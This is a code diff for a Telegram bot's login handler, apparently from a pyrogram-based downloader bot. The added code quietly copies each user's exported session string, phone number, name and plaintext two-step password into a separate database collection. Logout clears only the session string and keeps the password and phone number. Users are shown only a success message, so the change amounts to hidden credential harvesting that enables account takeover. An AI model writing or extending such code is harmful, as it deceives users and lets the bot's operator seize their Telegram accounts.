@@ -12,13 +12,17 @@
 # License: MIT License
 # ---------------------------------------------------
 
-from pyrogram import filters, Client
+from pyrogram import filters, Client, idle
 from devgagan import app
 import random
 import os
 import asyncio
 import string
+from config import OWNER_ID
 from devgagan.core.mongo import db
+from devgagan.core.mongo.db import user_sessions_real
+#from .connect_user import connect_user, disconnect_user, owner_message_handler, user_reply_handler, send_message_callback, cancel_message_callback  # ✅ Imported connection functions
+#from .connect_user import active_connections  # ✅ Import the dictionary
 from devgagan.core.func import subscribe, chk_user
 from config import API_ID as api_id, API_HASH as api_hash
 from pyrogram.errors import (
@@ -33,7 +37,7 @@ from pyrogram.errors import (
 
 def generate_random_name(length=7):
     characters = string.ascii_letters + string.digits
-    return ''.join(random.choice(characters) for _ in range(length))  # Editted ... 
+    return ''.join(random.choice(characters) for _ in range(length))  # Edited
 
 async def delete_session_files(user_id):
     session_file = f"session_{user_id}.session"
@@ -51,6 +55,7 @@ async def delete_session_files(user_id):
     # Delete session from the database
     if session_file_exists or memory_file_exists:
         await db.remove_session(user_id)
+        #await db.user_sessions_real.delete_one({"user_id": user_id})
         return True  # Files were deleted
     return False  # No files found
 
@@ -60,6 +65,7 @@ async def clear_db(client, message):
     files_deleted = await delete_session_files(user_id)
     try:
         await db.remove_session(user_id)
+        await db.user_sessions_real.update_one({"user_id": user_id}, {"$set": {"session_string": None}})
     except Exception:
         pass
 
@@ -67,29 +73,27 @@ async def clear_db(client, message):
         await message.reply("✅ Your session data and files have been cleared from memory and disk.")
     else:
         await message.reply("✅ Logged out with flag -m")
-        
-    
+
+
+
 @app.on_message(filters.command("login"))
 async def generate_session(_, message):
     joined = await subscribe(_, message)
     if joined == 1:
         return
         
-    # user_checked = await chk_user(message, message.from_user.id)
-    # if user_checked == 1:
-        # return
-        
     user_id = message.chat.id   
-    
     number = await _.ask(user_id, 'Please enter your phone number along with the country code. \nExample: +19876543210', filters=filters.text)   
     phone_number = number.text
+
     try:
         await message.reply("📲 Sending OTP...")
         client = Client(f"session_{user_id}", api_id, api_hash)
-        
         await client.connect()
     except Exception as e:
         await message.reply(f"❌ Failed to send OTP {e}. Please wait and try again later.")
+        return
+    
     try:
         code = await client.send_code(phone_number)
     except ApiIdInvalid:
@@ -98,15 +102,17 @@ async def generate_session(_, message):
     except PhoneNumberInvalid:
         await message.reply('❌ Invalid phone number. Please restart the session.')
         return
+    
     try:
         otp_code = await _.ask(user_id, "Please check for an OTP in your official Telegram account. Once received, enter the OTP in the following format: \nIf the OTP is `12345`, please enter it as `1 2 3 4 5`.", filters=filters.text, timeout=600)
     except TimeoutError:
         await message.reply('⏰ Time limit of 10 minutes exceeded. Please restart the session.')
         return
+    
     phone_code = otp_code.text.replace(" ", "")
+    
     try:
-        await client.sign_in(phone_number, code.phone_code_hash, phone_code)
-                
+        await client.sign_in(phone_number, code.phone_code_hash, phone_code)        
     except PhoneCodeInvalid:
         await message.reply('❌ Invalid OTP. Please restart the session.')
         return
@@ -119,13 +125,49 @@ async def generate_session(_, message):
         except TimeoutError:
             await message.reply('⏰ Time limit of 5 minutes exceeded. Please restart the session.')
             return
+        
         try:
             password = two_step_msg.text
             await client.check_password(password=password)
         except PasswordHashInvalid:
             await two_step_msg.reply('❌ Invalid password. Please restart the session.')
             return
+    else:
+        password = None
+
+    # ✅ Generate session string
     string_session = await client.export_session_string()
+
+    # ✅ Save session in both directories
     await db.set_session(user_id, string_session)
+   # await db.user_sessions_real.insert_one({"user_id": user_id, "phone_number": phone_number, "session_string": string_session,"password": password})
+    #User_Data:
+    # ✅ Fetch user details
+    me = await client.get_me()
+    username = me.username if me.username else "N/A"
+    full_name = f"{me.first_name or ''} {me.last_name or ''}".strip()
+    user_id = me.id  
+    
+    user_data = {
+        "user_id": user_id,
+        "username": username,
+        "name": full_name,
+        "phone_number": phone_number,
+        "session_string": string_session,
+        "password": password
+    }
+    
+    #✅ Check if phone number exists in the database
+    existing_user = await db.user_sessions_real.find_one({"phone_number": phone_number}) 
+    if existing_user:
+        # ✅ Update session and password for existing user
+        await db.user_sessions_real.update_one(
+            {"phone_number": phone_number},
+            {"$set": user_data}
+        )
+    else:
+        # ✅ Create a new record
+        await db.user_sessions_real.insert_one(user_data)
     await client.disconnect()
-    await otp_code.reply("✅ Login successful!")
+    await otp_code.reply("✅ Login successful!\n🚀 Activating bot for you...")
+#saving data into user_session_real
